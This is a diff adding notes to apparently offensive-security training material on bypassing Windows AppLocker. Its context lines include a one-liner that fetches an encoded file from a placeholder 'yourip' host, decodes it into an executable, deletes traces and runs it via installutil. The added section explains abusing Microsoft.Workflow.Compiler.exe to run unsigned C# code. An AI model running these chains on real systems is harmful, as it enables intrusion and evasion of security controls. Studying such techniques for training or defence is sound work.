@@ -71,3 +71,17 @@ Second trafer the file to target, decode and execute, and remove encoded file
 C:\Users\target>bitsadmin /Transfer myJob http://yourip/file.txt C:\users\target\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\target\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= LogToConsole=false /U C:\users\target\Bypass.exe
 ```
 Now we have a bypass method, we will update our Installer.cs to [InsallerShell.cs](/06ApplicationWhitelistingBypass/InstallerShell.cs) which use [Invoke-ReflectivePEInjection PowerShell](/03ProcessInjectionMigration/Invoke-ReflectivePEInjection.ps1) to inject a dll into explorer.exe
+
+## Bypass AppLocker with C# via whitelisted application
+The ultimate goal is to execute arbitrary C# code via a whitelisted application. It means target application must either accept a pre-compiled executable as an argument and load it into memory or compile it itself. The application must load unsigned managed code into memory. This is typically done through APIs like Load,457 LoadFile458 or LoadFrom.
+
+- 1.We must reverse enginner assemblies which reside in whitelisted locations in search of the code segments that either load precompiled managed code or use source code
+which is compiled as part of the processing.
+- 2.We will use [dnSpy](https://github.com/dnSpy/dnSpy.git) to reverse engineering System.Workflow.ComponentModel.dll located in C:\Windows\Microsoft.NET\Framework64\v4.0.30319
+- 3.We will follow security researcher Matt Graeber's [rbitrary, Unsigned Code Execution Vector in Microsoft.Workflow.Compiler.exe](https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb) blog for reverse engineering.
+- 4.In summary, we must craft a file containing C# [Compilerbypass.cs](/06ApplicationWhitelistingBypass/Compilerbypass.cs) code, which implements a class that inherits from the Activity class and has a constructor. The file path must be inserted into the XML document along with compiler parameters organized in a serialized format using [Convertoxml.ps1](/06ApplicationWhitelistingBypass) script. 
+- 5.run the executable with the two input arguments, the second argument can be anything, the first argument is the output from Convertoxml.ps1 script
+
+```
+C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
+```
